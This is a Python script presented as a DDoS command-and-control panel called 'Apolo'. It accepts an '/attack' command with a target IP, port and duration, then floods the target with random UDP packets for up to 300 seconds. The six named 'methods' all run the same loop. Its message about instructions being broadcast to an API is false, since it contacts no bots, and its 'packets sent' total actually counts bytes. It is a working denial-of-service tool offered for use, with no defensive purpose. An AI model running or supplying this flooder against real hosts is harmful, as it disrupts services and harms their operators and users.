import os
import time
import threading
import socket
from colorama import Fore, init

init(autoreset=True)

# Limpia consola
os.system("cls" if os.name == "nt" else "clear")

# Banner amarillo
banner = f"""{Fore.YELLOW}
          :::     :::::::::   ::::::::  :::        ::::::::   ::::::::   :::::::: 
       :+: :+:   :+:    :+: :+:    :+: :+:       :+:    :+: :+:    :+: :+:    :+: 
     +:+   +:+  +:+    +:+ +:+    +:+ +:+       +:+    +:+ +:+              +:+   
   +#++:++#++: +#++:++#+  +#+    +:+ +#+       +#+    +:+ +#+            +#+      
  +#+     +#+ +#+        +#+    +#+ +#+       +#+    +#+ +#+          +#+         
 #+#     #+# #+#        #+#    #+# #+#       #+#    #+# #+#    #+#  #+#           
###     ### ###         ########  ########## ########   ########  ##########      
"""
print(banner)
print(Fore.WHITE + "C2 by [rockyy]")

methods = ["HUDP", "UDPBYPASS", "UDPGOOD", "UDPPACKETS", "UDPSOCKETS", "UDPPPS"]
attack_in_progress = False

def show_methods():
    print(Fore.WHITE + "\nAvailable Methods:")
    for method in methods:
        print(f" - {method}")
    print()

def attack(ip, port, duration, method):
    global attack_in_progress
    attack_in_progress = True

    try:
        print(Fore.BLUE + "\nBroadcasted instructions sent to api!\n")
        timeout = time.time() + duration
        bytes_sent = 0

        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((ip, port))
                    data = os.urandom(1400)
                    s.send(data)
                    bytes_sent += len(data)
            except:
                pass

        print(Fore.GREEN + f"\n[FINISHED] Attack completed. Total packets sent: {bytes_sent}\n")
    except Exception as e:
        print(Fore.RED + f"[ERROR] {str(e)}")
    finally:
        attack_in_progress = False

while True:
    if not attack_in_progress:
        prompt = Fore.BLUE + "Apolo" + Fore.WHITE + "•C2 > "
        cmd = input(prompt).strip()

        if cmd.lower() == "/methods":
            show_methods()

        elif cmd.lower().startswith("/attack"):
            parts = cmd.split()
            if len(parts) != 5:
                print(Fore.RED + "Usage: /attack <ip> <port> <time> <method>")
                continue

            ip, port_str, time_str, method = parts[1], parts[2], parts[3], parts[4].upper()

            if method not in methods:
                print(Fore.RED + "Invalid method.")
                continue

            try:
                port = int(port_str)
                duration = int(time_str)
                if duration > 300:
                    print(Fore.RED + "Maximum allowed time is 300 seconds.")
                    continue
                threading.Thread(target=attack, args=(ip, port, duration, method)).start()
            except ValueError:
                print(Fore.RED + "Port and time must be integers.")
        else:
            print(Fore.RED + "Unknown command.")
    else:
        time.sleep(1)
